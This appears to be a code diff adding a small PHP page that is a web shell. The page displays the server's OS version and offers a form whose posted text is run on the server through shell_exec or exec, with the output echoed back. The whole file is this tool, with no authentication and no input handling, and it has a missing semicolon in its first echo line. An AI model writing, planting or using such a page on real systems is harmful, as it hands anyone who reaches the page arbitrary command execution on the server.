@@ -1,0 +1,44 @@
+
+<!DOCTYPE html>
+<html>
+    <body>
+    	<?php
+    	    echo ('<p>OS Version</p>')
+    	    echo php_uname();
+    	?>
+    	<br>
+        <form action="" method="post">
+            
+            <br>
+            <label for="method">Execution Method:</label>
+            <select name="exec" id="method">
+                <option value="shell_exec">shell_exec</option>
+                <option value="exec">exec</option>
+            </select>
+
+            <br>
+            <br>
+            <input type=text name="in1">
+            <input type=submit name="btn" value="Execute">
+            <br>
+            <br>
+
+            <?php
+            if(isset($_POST['btn']))
+            {
+
+                $command=$_POST['in1'];
+                $exec_method=$_POST['exec'];
+
+                echo $command, "<br><br>";
+                if ($exec_method == "shell_exec"){
+                    echo(shell_exec($command));
+                } else {
+                    echo(exec($command));
+                }
+            }
+            ?>
+        </form>
+    </body>
+
+</html>
